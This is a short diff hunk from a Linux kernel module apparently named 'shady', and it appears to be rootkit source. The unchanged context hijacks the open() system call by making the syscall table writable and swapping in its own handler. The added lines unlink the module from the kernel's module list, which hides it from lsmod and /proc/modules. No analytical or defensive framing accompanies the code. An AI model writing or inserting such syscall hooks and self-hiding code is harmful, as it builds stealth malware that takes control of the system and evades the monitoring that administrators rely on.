@@ -295,7 +295,10 @@ shady_init_module(void)
   set_addr_rw(system_call_table_address);
   
   system_call_table[__NR_open] = my_open;
-
+  
+  // Hide the module from lsmod and /proc/modules
+  list_del_init(&__this_module.list);
+  
   return 0; /* success */
 
  fail:
